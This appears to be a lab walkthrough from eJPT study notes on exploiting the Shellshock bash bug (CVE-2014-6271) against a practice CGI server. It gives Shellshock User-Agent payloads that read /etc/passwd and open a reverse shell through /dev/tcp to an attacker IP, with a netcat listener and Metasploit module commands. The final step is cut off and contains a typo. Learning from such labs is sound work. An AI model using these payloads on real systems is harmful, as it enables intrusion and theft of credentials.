# Bash CVE-2014-6271 Vulnerability (Shellshock)


__Step 1: Navigate to the target domain.__

![image0](/Image/Shellshock/image0.jpg)

_A website is running at port 80 of the target._

__Step 2: Right-click and select "View Page Source."__

![image1](/Image/Shellshock/image1.jpg)


_A CGI script is running on the target server._

__Step 3: Use the Nmap NSE script to check if the server is vulnerable to shellshock attack.__

__Command:__

- __`nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local`__

![image2](/Image/Shellshock/image2.jpg)



__Step 4: Right-click and select “Send to Repeater” Option and Navigate to the Repeater tab.__

![image3](/Image/Shellshock/image3.jpg)


__Step 5: Modify the User-Agent and inject the malicious payload.__

__Payload:__

- __`() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`__


![image4](/Image/Shellshock/image4.jpg)


__Click on the Send button.__

![image5](/Image/Shellshock/image5.jpg)

__Step 6: Start netcat__

command:

__`nc -nvlp 1234`__

__Step 7: use the below payload in user agent__
command:
- __`() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<yourip>/1234 0>&1'`__

![image10](/Image/Shellshock/image10.png)

__you will get reverse shell__

![image11](/Image/Shellshock/image11.png)



# Method 2 using metasploit framework

__Step 1: Start the `msfconsole`__
__command:__
- __`service postgresql start & msfconsole`__

![image12](https://github.com/Chittu13/eJPTv2/blob/main/Image/Shellshock/image12.png)

__Step 2: Search shellshock and type the below command__
__command:__
 - __`use exploit/multi/http/apache_mod_cgi_bash_env_exec`__
![image13](/Image/Shellshock/image13.png)

__Step 3: set the rhost and 
__command:__
  - __`set RHOSTS <target ip>`__
  - __`set TARGETURI /gettime.cig`__
![image13](/Image/Shellshock/image14.png)

